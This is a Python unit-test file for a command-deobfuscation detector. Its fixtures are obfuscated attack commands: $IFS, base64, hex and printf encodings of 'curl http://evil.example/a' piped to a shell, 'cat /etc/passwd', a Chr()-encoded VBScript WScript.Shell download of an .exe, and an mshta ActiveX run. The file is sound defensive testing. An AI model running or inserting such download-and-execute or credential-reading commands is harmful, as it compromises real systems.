"""Tests for Linux shell (bash/sh) and VBScript/JScript deobfuscation."""

from __future__ import annotations

import unittest

from cmd_unmask.models import Severity
from cmd_unmask.resolver import resolve_expression_node as resolve_expressions
from cmd_unmask.unpacker import unmask_command


class TestLinuxShellDeobfuscationLayer(unittest.TestCase):
    """Verify static Linux shell ($IFS, ANSI-C, base64, xxd/printf) deobfuscation and rigidity."""

    def test_ifs_inline_delimiter_unmasked_and_scored(self) -> None:
        cmd = "curl$IFS-s$IFShttp://evil.example/a|sh"
        res = resolve_expressions(cmd)
        self.assertTrue(res.modified)
        self.assertEqual(res.resolved_text, "curl -s http://evil.example/a|sh")

        verdict = unmask_command(cmd, source_id="linux-ifs-1")
        self.assertIn("curl -s http://evil.example/a|sh", verdict.primary_unmasked_payload)
        self.assertIn(verdict.severity, (Severity.HIGH, Severity.CRITICAL))
        mitre_ids = {m.mitre_id for m in verdict.behavioral_matches}
        self.assertIn("T1059.004", mitre_ids)
        self.assertIn("T1105", mitre_ids)

        res2 = resolve_expressions("cat${IFS}/etc/passwd")
        self.assertTrue(res2.modified)
        self.assertEqual(res2.resolved_text, "cat /etc/passwd")

    def test_ansi_c_hex_and_octal_quoting_folded(self) -> None:
        res_hex = resolve_expressions("$'\\x63\\x75\\x72\\x6c'")
        self.assertTrue(res_hex.modified)
        self.assertEqual(res_hex.resolved_text, "'curl'")

        res_oct = resolve_expressions("$'\\143\\165\\162\\154'")
        self.assertTrue(res_oct.modified)
        self.assertEqual(res_oct.resolved_text, "'curl'")

    def test_echo_base64_decode_pipe_to_shell(self) -> None:
        for flag in ("-d", "--decode"):
            cmd = f"echo Y3VybCAtcyBodHRwOi8vZXZpbC5leGFtcGxlL2E= | base64 {flag} | bash"
            verdict = unmask_command(cmd, source_id="linux-b64-1")
            self.assertIn("curl -s http://evil.example/a", verdict.primary_unmasked_payload)
            self.assertIn(verdict.severity, (Severity.HIGH, Severity.CRITICAL))
            mitre_ids = {m.mitre_id for m in verdict.behavioral_matches}
            self.assertIn("T1059.004", mitre_ids)
            self.assertIn("T1105", mitre_ids)

    def test_xxd_and_printf_hex_to_shell_pipelines(self) -> None:
        cmd_xxd = "echo 6375726c20687474703a2f2f6576696c2e6578616d706c652f61 | xxd -r -p | sh"
        verdict_xxd = unmask_command(cmd_xxd, source_id="linux-xxd-1")
        self.assertIn("curl http://evil.example/a", verdict_xxd.primary_unmasked_payload)
        self.assertIn(verdict_xxd.severity, (Severity.HIGH, Severity.CRITICAL))

        cmd_printf = (
            "printf '\\x63\\x75\\x72\\x6c\\x20\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f"
            "\\x65\\x76\\x69\\x6c\\x2e\\x65\\x78\\x61\\x6d\\x70\\x6c\\x65\\x2f\\x61' | bash"
        )
        verdict_printf = unmask_command(cmd_printf, source_id="linux-printf-1")
        self.assertIn("curl http://evil.example/a", verdict_printf.primary_unmasked_payload)
        self.assertIn(verdict_printf.severity, (Severity.HIGH, Severity.CRITICAL))

    def test_benign_linux_sysadmin_commands_score_benign(self) -> None:
        benign_cmds = [
            "apt-get update && apt-get install -y curl",
            "systemctl restart nginx",
            "ls -la /var/log",
            'printf "Hello %s\\n" "$USER"',
            "IFS= read -r line < file.txt",
        ]
        for idx, cmd in enumerate(benign_cmds):
            verdict = unmask_command(cmd, source_id=f"linux-benign-{idx}")
            self.assertEqual(verdict.severity, Severity.BENIGN, f"False positive on: {cmd}")
            self.assertEqual(verdict.risk_score, 0, f"Non-zero score on: {cmd}")


class TestVBScriptAndJScriptDeobfuscation(unittest.TestCase):
    """Verify static VBScript/JScript Chr()/ChrW(), ExecuteGlobal, and T1059.005/007 rules."""

    def test_chr_chrw_hex_arithmetic_and_ampersand_concat(self) -> None:
        expr = "Chr(104) & ChrW(&H74) & Chr(100+16) & Chr(112) & ':' & '//evil.example/a'"
        res = resolve_expressions(expr)
        self.assertTrue(res.modified)
        self.assertEqual(res.resolved_text, "'http://evil.example/a'")

    def test_execute_global_and_eval_unwrapping_with_t1059_005(self) -> None:
        # ExecuteGlobal(Chr(87)&Chr(83)&...) -> WScript.Shell / http://evil.example/b.exe
        payload = (
            "wscript.exe //nologo C:\\Users\\Public\\drop.vbs "
            "ExecuteGlobal(Chr(67)&Chr(114)&Chr(101)&Chr(97)&Chr(116)&Chr(101)&"
            "Chr(79)&Chr(98)&Chr(106)&Chr(101)&Chr(99)&Chr(116)&"
            "Chr(40)&Chr(34)&Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&"
            "Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)&Chr(34)&Chr(41)&"
            "Chr(46)&Chr(82)&Chr(117)&Chr(110)&Chr(32)&Chr(34)&"
            "Chr(99)&Chr(109)&Chr(100)&Chr(32)&Chr(47)&Chr(99)&Chr(32)&"
            "Chr(99)&Chr(117)&Chr(114)&Chr(108)&Chr(32)&Chr(104)&Chr(116)&Chr(116)&Chr(112)&"
            "Chr(58)&Chr(47)&Chr(47)&Chr(101)&Chr(118)&Chr(105)&Chr(108)&Chr(46)&Chr(101)&Chr(120)&Chr(97)&Chr(109)&Chr(112)&Chr(108)&Chr(101)&Chr(47)&Chr(98)&Chr(46)&Chr(101)&Chr(120)&Chr(101)&Chr(34))"
        )
        verdict = unmask_command(payload, source_id="vbs-exec-1")
        self.assertIn("CreateObject(\"WScript.Shell\").Run \"cmd /c curl http://evil.example/b.exe\"", verdict.primary_unmasked_payload)
        self.assertIn(verdict.severity, (Severity.HIGH, Severity.CRITICAL))
        mitre_ids = {m.mitre_id for m in verdict.behavioral_matches}
        self.assertIn("T1059.005", mitre_ids)

    def test_jscript_activex_t1059_007_flagged(self) -> None:
        cmd = 'mshta.exe javascript:var s=new ActiveXObject("WScript.Shell");s.Run("http://evil.example/j");'
        verdict = unmask_command(cmd, source_id="js-exec-1")
        self.assertIn(verdict.severity, (Severity.HIGH, Severity.CRITICAL))
        mitre_ids = {m.mitre_id for m in verdict.behavioral_matches}
        self.assertIn("T1059.007", mitre_ids)

    def test_out_of_bounds_chr_and_benign_wsh_admin_remain_safe(self) -> None:
        for bad in ("Chr(-1)", "Chr(99999999)", "ChrW(99999999)"):
            res = resolve_expressions(bad)
            self.assertEqual(res.resolved_text, bad)

        benign_cmds = [
            r"cscript.exe //NoLogo C:\Windows\System32\slmgr.vbs /xpr",
            "wscript.exe //B update_inventory.vbs",
            'WScript.Echo "Status: OK" & Chr(13) & Chr(10)',
        ]
        for idx, cmd in enumerate(benign_cmds):
            verdict = unmask_command(cmd, source_id=f"vbs-benign-{idx}")
            self.assertEqual(verdict.severity, Severity.BENIGN, f"False positive on: {cmd}")
            self.assertEqual(verdict.risk_score, 0, f"Non-zero score on: {cmd}")


if __name__ == "__main__":
    unittest.main()
